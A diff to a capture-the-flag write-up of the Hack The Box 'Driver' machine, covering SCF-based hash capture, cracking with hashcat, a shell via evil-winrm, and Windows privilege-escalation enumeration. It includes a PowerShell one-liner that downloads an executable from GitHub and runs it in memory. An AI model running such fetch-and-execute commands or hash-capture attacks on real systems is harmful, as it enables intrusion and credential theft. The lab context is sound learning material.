@@ -21,11 +21,11 @@ output: html_document
 </div>
 
 **Ports/services exploited:** 80/http, 445/SMB\\
-**Tools:** autorecon, msfvenom, responder, hashcat, evil-winrm\\
+**Tools:** autorecon, msfvenom, responder, hashcat, evil-winrm, winpeas\\
 **Techniques:** SCF (Shell Command Files) attacks\\
-**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution), Powershell
+**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution), Powershell, PrintNightmare
 
-**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash.
+**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash. The hash can be cracked wiithin seconds, and we can then use the credentials with *evil-winrm* to get a PowerShell shell on the box. From there, enumeration reveals that *spoolsv* is listening, which is a service affected by many vulnerabilities known as *PrintNightmare*. 
 
 ## 1. Services enumeration
 {:style="color:DarkRed; font-size: 170%;"}
@@ -208,12 +208,61 @@ One thing I've been wondering so far is where exactly the file is being uploaded
 ![fw_up.php]({{https://jsom1.github.io/}}/_images/htb_driver_script.png)
 </div>
 
-We see the upload location is *C:\\firmwares\\*. I didn't know why there were 2 *\\* and from a quick research, it appears that double backslash at the very beginning of a path indicates a UNC path. We saw that notion in the exploit earlier, so let's get more information about it: UNC (Universal Naming Convention) is a format specifying the location of resources on a LAN. It uses the format *\\server-name\shared-resource-pathname*. For example, we could access the file test.txt in the directory DIR on the shared server SHAREDSERV with the command *\\SHAREDSERV\DIR\test.txt*. 
+We see the upload location is *C:\\firmwares\\*. I didn't know why there were 2 *\\* and from a quick research, it appears that double backslash at the very beginning of a path indicates a UNC path. We saw that notion in the exploit earlier, so let's get more information about it: UNC (Universal Naming Convention) is a format specifying the location of resources on a LAN. It uses the format *\\server-name\shared-resource-pathname*. For example, we could access the file test.txt in the directory DIR on the shared server SHAREDSERV with the command *\\SHAREDSERV\DIR\test.txt*.\\
+So, is this an SMB share? I tried getting more information by retrieving the connections established from the SMB client to the SMB servers with the following PS cmdlet:
 
-However, there's nothing in that directory. There's probably a cleaning script that is ran by a cronjob. Is this an 
+````
+Get-SmbConnection
+``````
+
+But we get the error "Cannot connect to CIM server. Access denied". Looking into *C:\\firmwares\\*, we see there's nothing here. There's probably a cleaning script that is ran by a cronjob.
+I then wanted to look into the printer directory (which is usually found in */windows/system32/spool/PRINTERS*. Even though we can access it, we can't display its content.\\
+
+The first thing I usually do once I have a foothold is looking at the current user's permissions. On Windows, the command is:
+
+````
+whoami /priv
+`````
+
+Sadly there's nothing interesting here. Let's upload *WinPEAS* and automate the enumeation. I have a version of *winPEASx64.exe* in the directory from which I started *evil-winrm*, so we can simply use *upload* on *evil-winrm* to get it on the box (I first created a *.tmp* directory):
+
+<div class="img_container">
+![winpeas upload]({{https://jsom1.github.io/}}/_images/htb_driver_transf.png)
+</div>
+
+Note that we could also use *certutil* or a PS cmdlet to download the files. Then, we can run the script:
+
+````
+./winPEASx64.exe
+`````
+
+It doesn't work, I get the error "*Program 'winPEASx64.exe' failed to run: The specified executable is not a valid application for this OS platform*". I also tried with *winPEASany.exe*, but I get the same error... I wanted to download other versions from the Github repo, but I can't find any *.exe* there (I don't know if it's a temporary issue or if I just don't understand the structure of the repo).
+
+Finally, I tried a one-liner to download and execute winPEASany from memory in PS. Before that, we specify the URL. The commands are the following:
+
+````
+# Get latest release
+$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+``````
+
+But this time the error states that "*The remote name could not be resolved: 'github.com'*". I'll add a command here that enables the colored version of winPEAS, in case the use of *winPEAS* worked or for a future use (we need to set a registry value to see the colors)
+
+````
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+`````
+
+After a moment of manual enumeration, I had to look for clues on the forum. Apparently, we have to look at *spoolsv*, which is a printer service. We could theoretically see it using the *Get-NetTCPConnection* cmdlet, but we don't have the permissions. It's the same for *netstat -a -b*, we get "*The requested operation requires elevation*" (note that it works without the *-b* flag, but we don't know what's listening in this case).\\
+Anyways, *winPEAS* should have revealed *spoolsv* on port 41410. From the internet, we learn that "*spoolsv.exe runs the Windows OS print spooler service. Any time you print something with Windows this important service caches the print job into memory so your printer can understand what to print*". 
+
+By searching for "print spooler service exploit", we see many promising results. Apparently, the class of vulnerabilities affecting the Windows print spooler is known as *PrintNightmare*
 
 
-Retrieves the connections established from the SMB client to the SMB servers.
+
+
+
+
 
 
 
